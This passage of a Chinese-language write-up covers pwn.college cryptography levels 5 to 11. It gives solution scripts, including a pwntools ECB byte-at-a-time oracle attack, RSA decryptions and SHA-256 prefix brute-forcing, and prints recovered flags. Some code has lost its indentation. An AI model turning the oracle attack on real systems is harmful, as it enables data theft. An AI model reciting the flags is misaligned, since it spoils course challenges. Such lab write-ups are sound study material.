class="line">key = a</span><br><span class="line">text = b</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB 表示模式是ECB模式</span></span><br><span class="line">den_text = aes.decrypt(text) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(den_text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level5：ECB已知密文攻击-https://zachgrace.com/posts/attacking-ecb/</p><p>wp：运行<code>/challenge/run</code>，根据<a href="https://discord.com/channels/750635557666816031/1193137618049831063/threads/1243932046611710034">Discord</a>提示得知这题是关于ECB攻击的题目，因此尝试输入<code>base64.b64encode(b'A'*15)</code>的base64编码，然后再尝试输入<code>base64.b64encode(b'A'*15+b'p')</code>的base64编码（因为flag开头字母是<code>p</code>），得到：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): 4SXc1LwERwQOBKZt4rCInS5O3Yevihuy2bnTOPn3DxWZOUY1LZ6B9pHGPJeIsR4gAjWf06jm/2HrwLV2c3Bv+g==</span><br><span class="line">secret ciphertext (hex): e125dcd4bc0447040e04a66de2b0889d 2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFB</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0fdN9imt+R0sJxGye4JemYbGOzhwqRHPYZy4RTjv/dn25I3mK8XeotVgMVlyCuPW1nFFsxqEyM8mmpjyEvfsDbQ=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 f74df629adf91d2c2711b27b825e9986 c63b3870a911cf619cb84538effdd9f6 e48de62bc5dea2d5603159720ae3d6d6 7145b31a84c8cf269a98f212f7ec0db4</span><br><span class="line">plaintext prefix (b64): QUFBQUFBQUFBQUFBQUFBcA==</span><br><span class="line">ciphertext (b64): ta3Mmvi7a/uvAgdN2uAl0eEl3NS8BEcEDgSmbeKwiJ0uTt2Hr4obstm50zj59w8VmTlGNS2egfaRxjyXiLEeIAI1n9Oo5v9h68C1dnNwb/o=</span><br><span class="line">ciphertext (hex): b5adcc9af8bb6bfbaf02074ddae025d1 e125dcd4bc0447040e04a66de2b0889d 2e4edd87af8a1bb2d9b9d338f9f70f15 993946352d9e81f691c63c9788b11e20 02359fd3a8e6ff61ebc0b57673706ffa</span><br></pre></td></tr></tbody></table></figure><p>发现得到的十六进制密文是相同的，以此类推能够推断出所有字符。推理过程如下（X是未知字符）：</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAp  wn.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAApw  n.college{<span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnv  <span class="strong">**XXXXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">AAAAAAAAAAAAAAAp  wn.college{cgH6u  lJVxhfCLLdZrJnv<span class="strong">**X  XXXXXXXXXXXXXXXXXXXXXX**</span>}</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">pwn.college{cgH6ulJVxhfCLLdZrJnvtIPk91D.ddzNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure><p>这里用到了<code>pwntools</code>工具来编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set architecture, os and log level</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>, log_level=<span class="string">"info"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the ELF file and execute it as a new process.</span></span><br><span class="line">challenge_path = <span class="string">"/challenge/run"</span></span><br><span class="line">p = process(challenge_path)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">6</span>):  <span class="comment"># 用于获取不同段的字符串</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        payload = base64.b64encode(<span class="string">b'A'</span>*j) + <span class="string">b'\n'</span></span><br><span class="line">        p.sendafter(<span class="string">b"plaintext prefix (b64): "</span>, payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        string = p.recvline()</span><br><span class="line">        <span class="comment">#print("string:" + string.split()[2].decode())</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload_1 = base64.b64encode(<span class="string">b'A'</span>*j+flag.encode()+<span class="built_in">chr</span>(i).encode()) + <span class="string">b'\n'</span></span><br><span class="line">            p.sendafter(<span class="string">"plaintext prefix (b64): "</span>, payload_1)</span><br><span class="line">            p.recvline() <span class="comment"># 注意这里获取的是密文的base64编码</span></span><br><span class="line">            string_1 = p.recvline()  <span class="comment"># 获取密文的十六进制字符串</span></span><br><span class="line">            <span class="comment">#print("string_1:"+string_1.split()[2].decode())</span></span><br><span class="line">            <span class="keyword">if</span> string_1.split()[k].decode() == string.split()[k].decode(): <span class="comment"># 用split得到对应字符串</span></span><br><span class="line">                flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"flag is: <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level6：Diffie-Hellman密钥交换技术（原理见上），填入B的值得到base64编码的密文</p><p>wp：这题卡了很久，最后还是靠着非预期得到了flag。一开始我是将B的值设为与A相同，没有得到正确flag，然后尝试将B的值设为与p值相同，得到密文，解码竟然得到了flag，但这不是正确的解题思路</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">g: 0x2</span><br><span class="line">A: 0xfa0b8116dec4ecacf9ef4caff2749e29a4945759b62e7c41a91c3c03583154a3f8a1744c07d130d1b2b395274c575054cef6aa73d86227d9061c14451b815f7796c4a8640eab5daf0c3e689ab3e439b6658e5db3d75070fab9d805bcbbb13da12319a79498007de2b95c7be9a2b0fa85d112094cc80c92a8d98fefb2f6f004bf29066d42745e39b02f64beca200e8b30525f7049ac9e4b090df91ed5eb4d346278cd7956250344f689d43a04074f1da36a8d4846c17a5659c754ddd792320d4e13e8ed93b713633d21e253af41331c27a201d13819ddbda3353ce55d5297534f308e70155370edd6a01e098ee16f8c1a45f9a5a989436c374286373655c73c8a</span><br><span class="line">B: 0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff</span><br><span class="line">secret ciphertext (b64): cHduLmNvbGxlZ2V7VUdoLVplcDVqY2YxN0FQNS1wa3MtU1Z1d0VyLmRoek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure></li><li><p>level7：通过RSA的公钥和私钥解密</p><p>wp：运行challenge，给出了<code>e</code>,<code>d</code>,<code>n</code>以及密文，根据RSA算法通过<code>pow(密文, d, n)</code>能够得到答案，但是运行脚本得不到结果，后来看到discord上有人提示使用<code>less /challenge/run</code>能够查看挑战源码，发现第七关代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level7</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will decrypt a secret encrypted with RSA (Rivest–Shamir–Adleman).</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">256</span></span><br><span class="line">    ciphertext = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag, <span class="string">"little"</span>), key.e, key.n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>)</span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line">    show_b64(<span class="string">"secret ciphertext"</span>, ciphertext)</span><br></pre></td></tr></tbody></table></figure><p>其中<code>int.from_bytes()</code>以及<code>to_bytes()</code>函数一般默认以大端序将字节解释为整数，而源码中用到的是小端序，因此wp脚本中也该使用小端序，代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_m = <span class="string">"VbWfMzwMhfVxTxPBD/WLAWRiAtR8g1Y+YuJdf2xqdENvDHO4v2QM5kkEJVYZLt+eXCNGiIGy/WiHo9blLlqRKb7SPXUef0rdoZaQ5ZeG2WRtzbPWWdrugnWoXKu60xzjTBQ0qdvclmXZyFnbUaU+vj9HykULn0vwHC/s3e2PUgeE8FyBvxoX6sVFzauPyenv+2NyqCZDoz96xAEJeKAVKhDrV8lbxTSyPT6y7V174dO1+EGl0gpGBGJTfFfCYdD/6YLhTHi0K3owEdjm2FB6eWiZBFDyT7K/VBin33cBqpuyemAVztJaO90V+HkbGIve98RZd9sNjx1U6olzehmbPA=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">d = <span class="number">0x545652bb7b4478a66b726fefb48a45826e51c8475446d91b2c3ffde600a22f384648f503fd67a907d6d1c76b3666741526093de8652b5c45b9656b4e665f6d34cd61ed89a488513ca138f952a04ce0e719e6cbe9a5d11f29d8b7d0ca541fa6e8efce584d6551cbba0b775cac43db97cdfbfb1a3a5a7318a7e19d3f3705837c1933450044c5c69c910c3657bf1f587e7c6285568e4854d10b2c086c6745e60dede8daa52c5c556a3933eb395918f3f8d03c26ae0e9359d1d78c40b5c2201efe503575a6ae30b940ceb44e1197c423321bb5b934ddc61034da3991f088334f3abb779ee4c00b3d689701159d51e8227175d9b8571b267581a4d6157e556a2c09a1</span></span><br><span class="line">n = <span class="number">0xee7d0787f9a314b5ba76e4301f09eb765db7421c6a8d01590b85cfd1536bb7d4c2c66bc63c0aacd742d2d32a20899d82a1574316be8fb37c65371ad145b2a13a87197b6670c73e5a83e7e762a2c45d895a8da0ebf5b10dfeac55a5016139d3618b1508590c462cd839cec7ed45a1c0a87847a5653b7168d623948df709ecc0f70df58b4ed8120faa259bdbb669feea6c7befb6ec22fd8252b2650fea4d8081a862c040528a0d28aea3c55dfb033089df51fdb12b6ac60fe04b18a28d072c6da7a712f91625f118fc49af2f1764fb56075f8608e3dccfd2ea4d2d8270c0595aa1346ccb0a8442ce29d2e034bd1125550634bb843b95b6ce837c74b8bc714b43f9</span></span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>level8：RSA算法给定<code>e</code>、<code>p</code>、<code>q</code>以及密文，求解明文</p><p>WP：关键是利用<strong>扩展欧几里得算法</strong>计算求出<code>d</code>的值，私钥指数d 是公钥指数 e 的模 ϕ(n)（即<code>(p-1)*(q-1)</code>）的乘法逆元，具体实现如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line"><span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br></pre></td></tr></tbody></table></figure><p>完成代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line"><span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line">secret_m = <span class="string">"82JbqdZh5kV/6Rpq3EthtJSjxZkYrfj7+qKdkzarL/8hi+dVndN3iDyto+UuAws1KbXyUGMWXATiOwvbGPtLJDJmyURj1ER6jEGJQtDt9g+NsZRzN21UDCTLkplTtZo1ZyPYTSPUiOMoPSYBU+pfZ5vwZRlQBhbq5Pb5vIoqeoBkUn/OTa2MEnXKV7/wUcT1wjnYIXQloqghy16YViQ8RveEW7md6S1LlNb4nLmJOESRAHvl6YENOJQ1pTNOEaccNmggEoWTdv3cCLBXxvt7wH4hsUMhEI1l5zFK7dWz5X4f0AsNf0B2kfAaJ53rB9w7ADGzNIF8MHO6o6LvYhTLkg=="</span></span><br><span class="line">secret_m = base64.b64decode(secret_m)</span><br><span class="line">p = <span class="number">0xb967abff3506c59500ae51ed28156e32528ddc3e87b1e01c95e8e5f6b724cbaf08f537cf3279134d886e8f5a3b8165dbcbe64bff248ba120b4628a962e8696d0971e122c09a2093eb08d13dc4cc2254b0cc682522e3f225f13e23c921c330fbb5200038f4e7f9083d699d52c2723ace20f8ab1e1ed0c161fc76e8098372ea753</span></span><br><span class="line">q = <span class="number">0xd39d2fef4307fce60af097d6d1ca15bc8256e83f537bb534b1f264222758015ac9cece15a56213e1170ae98250bf3aad5fd44b23b810e2093d252c272ec14e7460ef06dc3e463521d5e58a7ed54cb60cef6b655fae51f4d544998f152373c72a5a933dce5e3f325586b6f2c06d71247994b186fa253663795ef1792792236375</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * q</span><br><span class="line">x = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, x)</span><br><span class="line">m = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>), d, n).to_bytes(<span class="number">256</span>, <span class="string">"little"</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># x = pow(y, d, n)#.to_bytes(256, "little").hex()</span></span><br><span class="line"><span class="comment"># print(hex(x))</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(secret_m, <span class="string">"little"</span>)))</span><br><span class="line"><span class="comment">#m = hex(pow(s, d, n))</span></span><br><span class="line">cleartext_hex = m</span><br><span class="line"><span class="comment"># print("Cleartext Hex: ", cleartext_hex)</span></span><br><span class="line"></span><br><span class="line">cleartext_bytes = <span class="built_in">bytes</span>.fromhex(cleartext_hex)</span><br><span class="line"><span class="comment"># print("Cleartext Bytes: ", cleartext_bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Cleartext Message: "</span>, cleartext_bytes.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></tbody></table></figure></li><li><p>level9：要求找到一个与给定密文相同的哈希前缀（<strong>哈希前缀碰撞</strong>），注意要求输入base64编码</p><p>WP：由于只需要匹配前两个字节即16位，因此可以暴力求解</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secret_sha = <span class="string">"1Hk="</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret_hash_prefix</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 生成随机数据（也可以是序列数据，逐个尝试）</span></span><br><span class="line">        data = random.randbytes(<span class="number">16</span>)  <span class="comment"># 随机生成 16 字节数据</span></span><br><span class="line">        hash_value = sha256(data)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 比较前两个字节</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == secret_hash_prefix:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设我们已经知道 secret_hash_prefix 是通过前面的代码获得的</span></span><br><span class="line">secret_hash_prefix = base64.b64decode(secret_sha)[:<span class="number">2</span>]<span class="comment">#sha256(b'secret_flag')[:2]  # 替换为真实的秘密哈希前缀</span></span><br><span class="line">collision_data = find_collision(secret_hash_prefix)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的碰撞数据: <span class="subst">{collision_data}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(collision_data))</span><br></pre></td></tr></tbody></table></figure></li><li><p>level10：给定一个base64编码，要求你再添加一段base64编码在末尾使得完整的数据经过hash后，前两个字节是null</p><p>WP：null字节的十六进制为<code>\x00</code>，这题依旧是暴力求解，这里我先假设添加到末尾的数据是数字而不包含字母，没想到成功了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Base64 decode the challenge data</span></span><br><span class="line">challenge_b64 = <span class="string">"cD4QncA+h/LdarOt1oxo3KZ4xGrN0aTFZ+SUbxNK9X4="</span></span><br><span class="line">challenge_data = base64.b64decode(challenge_b64)</span><br><span class="line"><span class="comment"># Step 2: Bruteforce to find the correct response data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_response</span>(<span class="params">challenge_data</span>):</span><br><span class="line">    response = <span class="number">0</span>  <span class="comment"># Start from 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Convert the response data to bytes and append it to the challenge data</span></span><br><span class="line">        response_data = <span class="built_in">str</span>(response).encode() <span class="comment"># 将response_data转换为字符串方便编码</span></span><br><span class="line">        data = challenge_data + response_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Compute SHA256 hash of the concatenated data</span></span><br><span class="line">        hash_value = hashlib.sha256(data).digest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the first two bytes of the hash are null bytes (0x00 0x00)</span></span><br><span class="line">        <span class="keyword">if</span> hash_value[:<span class="number">2</span>] == <span class="string">b'\x00\x00'</span>:</span><br><span class="line">        <span class="built_in">print</span>(hash_value)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        response += <span class="number">1</span>  <span class="comment"># Increment response and try again</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Run the bruteforce function</span></span><br><span class="line">response_data = find_response(challenge_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"找到的 response data 是: <span class="subst">{response_data}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>得到明文，然后经过base64编码后输入终端得到flag</p></li><li><p>level11：通过RSA的公钥和私钥和密文求出明文</p><p>WP：查看源码，发现challenge是经过公钥加密过的密文</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level11</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    In this challenge you will complete an RSA challenge-response.</span></span><br><span class="line"><span class="string">    You will be provided with both the public key and private key.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">    show_hex(<span class="string">"e"</span>, key.e)</span><br><span class="line">    show_hex(<span class="string">"d"</span>, key.d)</span><br><span class="line">    show_hex(<span class="string">"n"</span>, key.n)</span><br><span class="line"></span><br><span class="line">    challenge = <span class="built_in">int</span>.from_bytes(get_random_bytes(<span class="number">256</span>), <span class="string">"little"</span>) % key.n</span><br><span class="line">    show_hex(<span class="string">"challenge"</span>, challenge)</span><br><span class="line"></span><br><span class="line">    response = input_hex(<span class="string">"response"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(response, key.e, key.n) == challenge:</span><br><span class="line">        show(<span class="string">"flag"</span>, flag.decode())</span><br></pre></td></tr></tbody></table></figure><p>因此可以根据私钥逆向求出明文</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a,m</span>):</span><br><span class="line"><span class="keyword">if</span> math.gcd(a,m) != <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">"a和m必须互质"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)  <span class="comment"># 计算模逆元</span></span><br><span class="line"></span><br><span class="line">n = <span 